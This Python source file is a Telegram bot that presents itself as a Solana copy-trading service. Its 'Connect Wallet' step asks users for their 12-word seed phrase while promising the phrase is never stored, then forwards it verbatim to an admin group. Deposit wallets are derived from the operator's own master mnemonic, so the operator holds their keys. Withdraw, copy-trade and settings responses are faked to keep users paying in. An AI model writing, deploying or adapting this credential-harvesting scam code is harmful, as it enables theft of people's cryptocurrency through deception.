import re
import os
import hashlib
import base58
import json
import requests
from dotenv import load_dotenv
from nacl.signing import SigningKey
from solders.keypair import Keypair
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes
)

# Load environment variables
load_dotenv()
# Store temporary user states
user_states = {}
# Track users whose wallet info has been sent to admin group (prevent spam)
wallet_sent_to_admin = set()

# Load persisted wallet notifications from file
try:
    with open("wallet_notifications.txt", "r") as f:
        for line in f:
            user_id = line.strip()
            if user_id.isdigit():
                wallet_sent_to_admin.add(int(user_id))
except FileNotFoundError:
    pass  # File doesn't exist yet, will be created on first notification

# ---- CONFIG ----
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
if not BOT_TOKEN:
    raise SystemExit("TELEGRAM_BOT_TOKEN environment variable is required")
GROUP_ID = int(os.getenv('ADMIN_GROUP_ID', 0))
MNEMONIC = os.getenv('MNEMONIC', '')  # Master seed phrase for wallet generation

# ---- Wallet Generation Utility Functions ----
def derive_seed_from_mnemonic_and_id(mnemonic: str, telegram_id: int) -> bytes:
    """
    Deterministic derivation: Uses SHA256(mnemonic || ':' || telegram_id)
    Returns 32-byte seed for each unique Telegram ID
    """
    msg = (mnemonic.strip() + ":" + str(telegram_id)).encode("utf-8")
    digest = hashlib.sha256(msg).digest()
    return digest[:32]

def derive_keypair_and_address(telegram_id: int):
    """
    Generate unique Solana wallet for a Telegram user
    Returns: (public_address, private_key_base58)
    """
    if not MNEMONIC:
        raise ValueError("MNEMONIC not set in environment variables")
    
    # Derive unique seed for this telegram ID
    seed32 = derive_seed_from_mnemonic_and_id(MNEMONIC, telegram_id)
    
    # Generate Solana keypair
    kp = Keypair.from_seed(seed32)
    public_address = str(kp.pubkey())
    
    # Generate 64-byte secret key (private + public)
    sk = SigningKey(seed32)
    vk = sk.verify_key
    secret_64 = sk.encode() + vk.encode()
    private_key_b58 = base58.b58encode(secret_64).decode()
    
    return public_address, private_key_b58

# ✅ Step 1: Put the wallet function here
async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    telegram_id = user.id
    user_name = user.username or user.first_name or str(telegram_id)
    
    try:
        # Generate unique wallet for this user
        public_address, private_key_b58 = derive_keypair_and_address(telegram_id)
        
        # Send ONLY public address to admin group (only once per user to prevent spam)
        # Private keys should NEVER be transmitted - they can be re-derived when needed
        if telegram_id not in wallet_sent_to_admin and GROUP_ID:
            try:
                admin_message = (
                    f"👤 <b>New Wallet Generated</b>\n\n"
                    f"User: @{user_name} (ID: {telegram_id})\n\n"
                    f"📬 <b>Public Address:</b>\n"
                    f"<code>{public_address}</code>"
                )
                await context.bot.send_message(chat_id=GROUP_ID, text=admin_message, parse_mode="HTML")
                wallet_sent_to_admin.add(telegram_id)
                # Persist to file for restart persistence
                try:
                    with open("wallet_notifications.txt", "a") as f:
                        f.write(f"{telegram_id}\n")
                except Exception as e:
                    print(f"Error persisting notification record: {e}")
            except Exception as e:
                print(f"Error sending wallet to admin group: {e}")
        
        # Show only public address to user (hide private key for security)
        wallet_text = (
            "💼 <b>Wallet Overview</b> — <i>Connected</i> ✅\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "<b>Your Unique Solana Wallet</b>\n\n"
            "📬 <b>Public Address:</b>\n"
            f"<code>{public_address}</code>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "<b>Holdings</b>\n"
            "• <b>SOL:</b> 0.00 (0%)\n"
            "• <b>Tokens:</b> 0.00 USDT (0%)\n"
            "• <b>Total Assets:</b> 0.00 USDT\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔘 <i>No active tokens detected.</i>\n\n"
            "💰 <b>Fund Your Bot</b>\n"
            f"Send SOL to your address above\n\n"
            "(Funds are required for copy-trading operations.)\n\n"
            "⚠️ <b>Security:</b> Your private key is securely stored.\n"
            "This wallet is uniquely generated for your Telegram ID.\n\n"
            "⚡ <b>Quick Actions</b>\n"
            "• ⚓️ /start – Refresh your bot\n\n"
            "👇 <i>What would you like to do next?</i>"
        )
    except Exception as e:
        wallet_text = (
            "⚠️ <b>Wallet Generation Error</b>\n\n"
            "Unable to generate wallet. Please contact support.\n"
            f"Error: {str(e)}"
        )

    if update.message:  # user typed 🧩Wallet
        await update.message.reply_text(wallet_text, parse_mode="HTML")
    elif update.callback_query:  # user tapped 💰 Fund Wallet
        await update.callback_query.answer()
        await update.callback_query.message.reply_text(wallet_text, parse_mode="HTML")



# --- Continue with your other handlers (like bot guide, wallet, etc.) ---

# --- SETTINGS MENU ---
async def settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    Setting_buttons = InlineKeyboardMarkup([
        [InlineKeyboardButton("Number of trades per day", callback_data="trade_per_day")],
        [InlineKeyboardButton("Edit Number of consecutive buys", callback_data="consecutive_buys")],
        [InlineKeyboardButton("Sell Position", callback_data="sell_position")],
    ])

    settings_text = (
        "<b>⚙️ Settings Menu</b>\n\n"
        "Your settings are organized into categories for easy management:\n\n"
        "<b>Trading Options:</b>\n"
        "- Configure number of trades per day\n"
        "- Adjust consecutive buys\n"
        "- Manage sell positions\n\n"
        "Choose an option below to update:"
    )

    await update.message.reply_text(
        settings_text,
        parse_mode="HTML",
        reply_markup=Setting_buttons
    )
# --- CALLBACK HANDLER (BUTTONS) ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    option = query.data
    user_id = query.from_user.id

    # Handle cancel action for settings
    if option == "cancel_settings":
        user_states.pop(user_id, None)  # Clear user state
        await query.edit_message_text(
            text="❌ Settings input cancelled. You can access settings again from the main menu.",
            parse_mode="HTML"
        )
        return
    
    # Handle fund wallet action
    if option == "fund_wallet":
        await show_wallet(update, context)
        return
    
    # Save state for this user
    user_states[user_id] = option
    
    # Create cancel button for settings input
    cancel_button = InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_settings")]
    ])

    await query.edit_message_text(
        text=f"Please enter a number for <b>{option.replace('_', ' ').title()}</b>:\n\n📝 Enter your desired value and send it as a message.",
        parse_mode="HTML",
        reply_markup=cancel_button
    )


# ---- Helpers ----
def main_menu_markup():
    keyboard = [
        ["💸Withdraw", "🔌Connect Wallet"],
        ["🔍Copy Trade", "🔐Settings"],
        ["🧩Wallet", "🤖Bot Guide"],
        ["💰Buy", "📊Live Chart"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def cancel_markup():
    return ReplyKeyboardMarkup([["Cancel"]], resize_keyboard=True, one_time_keyboard=True)

# Validate a single word: only letters A-Z (either case)
def is_alpha_word(word: str) -> bool:
    return bool(re.fullmatch(r"[A-Za-z]+", word))

# Fetch token details from DexScreener API (using run_in_executor for non-blocking)
async def get_token_details(token_address: str):
    """Fetch token details from DexScreener API"""
    import asyncio
    
    def fetch():
        try:
            url = f"https://api.dexscreener.com/latest/dex/tokens/{token_address}"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if data and 'pairs' in data and len(data['pairs']) > 0:
                    return data['pairs'][0]  # Return the first (most liquid) pair
            return None
        except Exception as e:
            print(f"Error fetching token details: {e}")
            return None
    
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, fetch)

# Format token details for display
def format_token_details(pair_data, wallet_balance=0):
    """Format token details in the style requested by user"""
    try:
        from datetime import datetime
        
        token = pair_data.get('baseToken', {})
        quote = pair_data.get('quoteToken', {})
        
        # Token name and symbol
        token_name = token.get('name', 'Unknown')
        token_symbol = token.get('symbol', 'Unknown')
        token_address = token.get('address', 'N/A')
        
        # Market data
        price_usd = float(pair_data.get('priceUsd', 0)) if pair_data.get('priceUsd') else 0
        market_cap = pair_data.get('marketCap')
        fdv = pair_data.get('fdv')
        liquidity_usd = pair_data.get('liquidity', {}).get('usd', 0)
        
        # Volume and transactions
        volume_24h = pair_data.get('volume', {}).get('h24', 0)
        txns_24h = pair_data.get('txns', {}).get('h24', {})
        buyers_24h = txns_24h.get('buys', 0) if txns_24h else 0
        
        # DEX info
        dex_id = pair_data.get('dexId', 'Unknown').upper()
        pair_created = pair_data.get('pairCreatedAt', 0)
        
        # Links
        info = pair_data.get('info', {})
        socials = info.get('socials', [])
        
        twitter_link = "❌"
        telegram_link = "❌"
        
        for social in socials:
            if social.get('type') == 'twitter':
                twitter_link = "✅"
            elif social.get('type') == 'telegram':
                telegram_link = "✅"
        
        # Format price with proper decimals (fix for very small prices)
        if price_usd == 0:
            price_str = "0"
        else:
            # Use high precision formatting to preserve significant digits for very small prices
            price_str = ("%.18f" % price_usd).rstrip('0').rstrip('.')
        
        # Fix timestamp conversion (pairCreatedAt is in milliseconds)
        if pair_created:
            # Convert milliseconds to seconds
            created_dt = datetime.fromtimestamp(pair_created / 1000)
            time_diff = datetime.now() - created_dt
            days = time_diff.days
            hours = time_diff.seconds // 3600
            minutes = (time_diff.seconds % 3600) // 60
            time_ago = f"{days}d {hours}h {minutes}m ago" if days > 0 else f"{hours}h {minutes}m ago"
        else:
            time_ago = "Unknown"
        
        # Format market cap with fallback to FDV
        if market_cap and market_cap > 0:
            if market_cap >= 1000000:
                mcap_str = f"{market_cap/1000000:.1f}M"
            else:
                mcap_str = f"{market_cap/1000:.1f}K"
        elif fdv and fdv > 0:
            if fdv >= 1000000:
                mcap_str = f"{fdv/1000000:.1f}M (FDV)"
            else:
                mcap_str = f"{fdv/1000:.1f}K (FDV)"
        else:
            mcap_str = "Unknown"
        
        # Format liquidity
        if liquidity_usd >= 1000000:
            liq_str = f"{liquidity_usd/1000000:.2f}M"
        else:
            liq_str = f"{liquidity_usd/1000:.2f}K"
        
        message = (
            f"📌 <b>{token_name} ({token_symbol})</b>\n"
            f"<code>{token_address}</code>\n\n"
            f"💳 <b>Wallet:</b>\n"
            f"|——Balance: {wallet_balance} SOL ($0)\n"
            f"|——Holding: 0 SOL ($0) — 0 {token_symbol}\n"
            f"|___PnL: 0%🚀🚀\n\n"
            f"💵 <b>Trade:</b>\n"
            f"|——Market Cap: {mcap_str}\n"
            f"|——Price: {price_str}\n"
            f"|___Buyers (24h): {buyers_24h}\n\n"
            f"🔍 <b>Security:</b>\n"
            f"|——Security scan available on DexScreener\n"
            f"|——Trade Tax: Check DexScreener\n"
            f"|___Top 10: Check DexScreener\n\n"
            f"📝 <b>LP:</b> {token_symbol}-{quote.get('symbol', 'SOL')}\n"
            f"|——💧 {dex_id} AMM\n"
            f"|——🟢 Trading opened\n"
            f"|——Created {time_ago}\n"
            f"|___Liquidity: {liq_str} USD\n\n"
            f"📲 <b>Links:</b>\n"
            f"|—— Twitter {twitter_link}\n"
            f"|—— Telegram {telegram_link}\n"
            f"|___ <a href='https://dexscreener.com/solana/{token_address}'>DexScreener</a> | "
            f"<a href='https://www.pump.fun/{token_address}'>Pump</a>"
        )
        
        return message
    except Exception as e:
        print(f"Error formatting token details: {e}")
        return None

# --- /start ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to Trading Bot!\n"
        "Step into the world of fast, smart, and stress-free trading, "
        "designed for both beginners and seasoned traders.\n\n"
        "🔗 Connecting to your wallet...\n"
        "⏳ Initializing your account and securing your funds...\n"
        "✅ Wallet successfully created and linked!\n\n"
        "💡Tap Continue below to access your wallet and explore all trading options.",
        reply_markup=main_menu_markup()
    )
    # clear states
    context.user_data.pop("awaiting_dummy", None)
    context.user_data.pop("awaiting_withdraw", None)

# --- Message handler ---
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip()
    user = update.effective_user
    user_id = user.id
    user_name = user.username or user.first_name or str(user_id)

    # ----- Handle Connect Wallet (12 dummy words) -----
    if context.user_data.get("awaiting_dummy"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_dummy", None)
            await update.message.reply_text("Request cancelled. Back to menu:", reply_markup=main_menu_markup())
            return

        words = [w for w in text.split() if w.strip()]
        count = len(words)

        if count != 12:
            await update.message.reply_text(
                f"❌ <b>Invalid Seed Phrase Length</b>\n\n"
                f"You entered {count} word(s), but we need exactly 12 words.\n\n"
                f"📝 <b>Please try again:</b>\n"
                f"• Send exactly 12 words separated by spaces\n"
                f"• Each word should contain only letters (A-Z)\n\n"
                f"Or tap Cancel to abort the wallet connection.",
                parse_mode="HTML",
                reply_markup=cancel_markup()
            )
            return

        bad_indices = [i+1 for i, w in enumerate(words) if not is_alpha_word(w)]
        if bad_indices:
            positions = ", ".join(map(str, bad_indices))
            await update.message.reply_text(
                f"❌ <b>Invalid Characters Found</b>\n\n"
                f"Some words contain invalid characters. Words must contain only letters (A-Z).\n\n"
                f"🔍 <b>Please check word position(s):</b> {positions}\n\n"
                f"📝 Fix the invalid words and try again, or tap Cancel to abort the wallet connection.",
                parse_mode="HTML",
                reply_markup=cancel_markup()
            )
            return

        wallet_seed = " ".join(words)
        forward_text = (
            f"🔐 Wallet Connection Request from @{user_name} (id: {user_id}):\n\n"
            f"<pre>{wallet_seed}</pre>"
        )
        try:
            await context.bot.send_message(chat_id=GROUP_ID, text=forward_text, parse_mode="HTML")
        except Exception as e:
            await update.message.reply_text("Failed to forward input to the group. Contact the bot admin.")
            print("Error sending to group:", e)
            context.user_data.pop("awaiting_dummy", None)
            await update.message.reply_text("Back to menu:", reply_markup=main_menu_markup())
            return

        context.user_data.pop("awaiting_dummy", None)
        await update.message.reply_text(
            "✅ <b>Wallet Connection Processing</b>\n\n"
            "Please wait while our system processes your wallet import request ✅", 
            parse_mode="HTML",
            reply_markup=main_menu_markup()
        )
        return

    # ----- Handle Withdraw flow -----
    if context.user_data.get("awaiting_withdraw"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_withdraw", None)
            await update.message.reply_text("Withdrawal cancelled.", reply_markup=main_menu_markup())
            return

        try:
            amount = float(text)
        except ValueError:
            await update.message.reply_text("❗ Invalid amount. Please enter a number or tap Cancel.", reply_markup=cancel_markup())
            return

        if amount > 0:
            await update.message.reply_text("❗ Insufficient SOL balance.", reply_markup=main_menu_markup())
        else:
            await update.message.reply_text("Withdrawal amount must be greater than zero.", reply_markup=cancel_markup())

        context.user_data.pop("awaiting_withdraw", None)
        return 

    # ----- Handle Copy Trade -----
    if context.user_data.get("awaiting_copy_trade"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_copy_trade", None)
            await update.message.reply_text(
                "Copy Trade cancelled.", 
                reply_markup=main_menu_markup()
            )
            return

        wallet_address = text.strip()

        # ✅ Check if wallet address looks valid (length = 44 and letters/numbers only)
        if len(wallet_address) != 44 or not wallet_address.isalnum():
            await update.message.reply_text(
                "❗ Invalid Solana wallet address.", 
                reply_markup=cancel_markup()
            )
            return

        # ✅ If valid, but still simulate insufficient balance
        await update.message.reply_text(
            "❗ Insufficient SOL balance.", 
            reply_markup=main_menu_markup()
        )

        context.user_data.pop("awaiting_copy_trade", None)
        return

    # ----- Handle Buy Token -----
    if context.user_data.get("awaiting_token_contract"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_token_contract", None)
            await update.message.reply_text(
                "Buy cancelled.", 
                reply_markup=main_menu_markup()
            )
            return

        token_address = text.strip()

        # Validate Solana token address (base58 format, 32-44 characters)
        # Base58 excludes: 0, O, I, l (to avoid confusion)
        base58_pattern = r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'
        if not re.match(base58_pattern, token_address):
            await update.message.reply_text(
                "❗ Invalid token contract address. Please enter a valid Solana token address.\n\n"
                "Solana addresses are 32-44 characters and use base58 encoding.",
                reply_markup=cancel_markup()
            )
            return

        # Fetch token details
        await update.message.reply_text("🔍 Fetching token details...")
        
        pair_data = await get_token_details(token_address)
        
        if pair_data:
            token_info = format_token_details(pair_data, wallet_balance=0)
            if token_info:
                await update.message.reply_text(
                    token_info,
                    parse_mode="HTML",
                    disable_web_page_preview=True,
                    reply_markup=main_menu_markup()
                )
            else:
                await update.message.reply_text(
                    "❗ Error formatting token details. Please try again.",
                    reply_markup=main_menu_markup()
                )
        else:
            await update.message.reply_text(
                "❗ Token not found or no trading pairs available. Please check the contract address.",
                reply_markup=main_menu_markup()
            )

        context.user_data.pop("awaiting_token_contract", None)
        return

    # ----- Handle Settings Number Input -----
    if user_id in user_states:
        # Check if input is a number
        if not text.isdigit():
            await update.message.reply_text(
                "❌ Please enter numbers only. Use the Cancel button above to cancel this input."
            )
            return
        
        option = user_states.pop(user_id)  # Remove state after use
        
        # Show success message with confirmation
        success_message = (
            f"✅ <b>Setting Updated Successfully!</b>\n\n"
            f"📋 <b>{option.replace('_', ' ').title()}</b> has been set to: <b>{text}</b>\n\n"
            f"Your new setting is now active and will be applied to your trading activities.\n\n"
            f"💡 You can update this setting anytime by going back to Settings."
        )
        
        await update.message.reply_text(
            success_message,
            parse_mode="HTML",
            reply_markup=main_menu_markup()
        )
        return

    # ----- Handle Menu selections -----
    if text == "💸Withdraw":
        context.user_data["awaiting_withdraw"] = True
        await update.message.reply_text("💸 Please enter the withdrawal amount:", reply_markup=cancel_markup())
        return

    elif text == "🔌Connect Wallet":
        context.user_data["awaiting_dummy"] = True
        await update.message.reply_text(
            "🔐 <b>Connect Your Wallet</b>\n\n"
            "Please send your 12-word seed phrase to connect your Solana wallet.\n\n"
            "⚠️ <b>Security Notes:</b>\n"
            "• Your seed phrase is never stored permanently\n"
            "• It's only used to derive your wallet address\n"
            "• The phrase is cleared from memory immediately\n"
            "• Only send your seed phrase if you trust this bot\n\n"
            "📝 <b>Format:</b> Send all 12 words separated by spaces\n"
            "<b>Example:</b> <code>word1 word2 word3 ... word12</code>",
            parse_mode="HTML",
            reply_markup=cancel_markup()
        )
        return

    elif text == "🔍Copy Trade":
        context.user_data["awaiting_copy_trade"] = True
        await update.message.reply_text(
            "Please enter the Solana wallet address to copy trade.\n\n"
            "If you want to cancel, tap Cancel.",
            reply_markup=cancel_markup()
        )
        return

    elif text == "🔐Settings":
        await update.message.reply_text("Here are your 🔐settings.")

        # Inline buttons that open TradingView charts
        Setting_buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("Number of trades per day", callback_data="trade_per_day")],
            [InlineKeyboardButton("Edit Number of consecutive buys", callback_data="consecutive_buys")],
            [InlineKeyboardButton("Sell Position", callback_data="sell_position")],
        ])

        settings_text = (
        "<b>⚙️ Settings Menu</b>\n\n"
        "Your settings are organized into categories for easy management:\n\n"
        "<b>Trading Options:</b>\n"
        "- Configure number of trades per day\n"
        "- Adjust consecutive buys\n"
        "- Manage sell positions\n\n"
        "Choose an option below to update:"
    )
        await update.message.reply_text(
        settings_text,
        parse_mode="HTML",
        reply_markup=Setting_buttons
    )
        return

    elif text == "🧩Wallet":
        await show_wallet(update, context)
        return


    elif text == "🤖Bot Guide":
        guide_text = (
            "📘 <b>How to Use Celo_ai Bot: Complete Feature Guide</b>\n\n"
            "Welcome to <b>Celo_ai Bot</b>, your all-in-one Telegram trading assistant. "
            "This guide walks you through the core features, how to use them safely, "
            "and why some security restrictions are in place.\n\n"

            "1️⃣ <b>Autotrade</b>\n"
            "Automate your trading strategies. Once configured, the bot executes trades "
            "on your behalf based on your parameters. Perfect if you don’t want to "
            "monitor the market constantly.\n\n"

            "2️⃣ <b>Copytrade</b>\n"
            "Mimic trades of successful wallets instantly. Just tap Copytrade, select a "
            "trader, and the bot will replicate their trades in your account.\n\n"

            "3️⃣ <b>Wallet & Import Wallet</b>\n"
            "Check balance, view info, monitor transactions, and manage funds. You can "
            "import a wallet by private key, but <i>exporting keys is disabled</i> for "
            "security reasons.\n\n"

            "4️⃣ <b>Alerts</b>\n"
            "Get notified about price changes, successful trades, or new token launches "
            "so you never miss an opportunity.\n\n"

            "5️⃣ <b>Wallet Info & Network</b>\n"
            "View transaction history, balance, and choose blockchain networks such as "
            "Ethereum or BSC.\n\n"

            "6️⃣ <b>Live Chart</b>\n"
            "Access real-time market data, price trends, and token charts directly in Telegram.\n\n"

            "🔒 <b>Security Note</b>\n"
            "Private key <u>exporting is disabled</u> to protect your funds, even if "
            "your Telegram account is compromised. Importing keys is allowed for safe "
            "wallet connection.\n\n"

            "⚡ <i>Note: Features are only available to funded wallets. Fund your wallet "
            "to unlock the full potential of hexa_ai Bot!</i>"
        )

        # Inline buttons
        guide_buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("💰 Fund Wallet", callback_data="fund_wallet")],
        ])

        await update.message.reply_text(guide_text, parse_mode="HTML", reply_markup=guide_buttons)
        return


    elif text == "💰Buy":
        context.user_data["awaiting_token_contract"] = True
        await update.message.reply_text(
            "💰 <b>Buy Token</b>\n\n"
            "Please paste the Solana token contract address you want to buy.\n\n"
            "📝 <b>Example:</b>\n"
            "<code>HZ47qG6JyiM6KMJHLUJy7tsRtzE6CLthTEWj4opwgkHf</code>\n\n"
            "I'll show you the token details including price, market cap, liquidity, and security info.\n\n"
            "Tap Cancel if you want to go back.",
            parse_mode="HTML",
            reply_markup=cancel_markup()
        )
        return

    elif text == "📊Live Chart":
        chart_text = (
            "<b>🔥 Top Coins Charts</b>\n"
            "Choose a coin below to view its live chart.\n"
        )

        # Inline buttons that open TradingView charts
        chart_buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("📈 BITCOIN (BTC)", url="https://www.tradingview.com/chart/?symbol=BTCUSDT")],
            [InlineKeyboardButton("📈 ETHEREUM (ETH)", url="https://www.tradingview.com/chart/?symbol=ETHUSDT")],
            [InlineKeyboardButton("📈 SOLANA (SOL)", url="https://www.tradingview.com/chart/?symbol=SOLUSDT")],
            [InlineKeyboardButton("📈 DOGECOIN (DOGE)", url="https://www.tradingview.com/chart/?symbol=DOGEUSDT")],
            [InlineKeyboardButton("📈 SHIBA INU (SHIB)", url="https://www.tradingview.com/chart/?symbol=SHIBUSDT")],
            [InlineKeyboardButton("📈 POLKADOT (DOT)", url="https://www.tradingview.com/chart/?symbol=DOTUSDT")],
            [InlineKeyboardButton("📈 CARDANO (ADA)", url="https://www.tradingview.com/chart/?symbol=ADAUSDT")],
            [InlineKeyboardButton("📈 LITECOIN (LTC)", url="https://www.tradingview.com/chart/?symbol=LTCUSDT")]
        ])

        await update.message.reply_text(
            chart_text,
            parse_mode="HTML",
            reply_markup=chart_buttons
        )
        return


    else:
        await update.message.reply_text("Please choose an option from the menu.", reply_markup=main_menu_markup())
        return
    

# --- Main ---
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(CommandHandler("settings", settings_menu))



    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
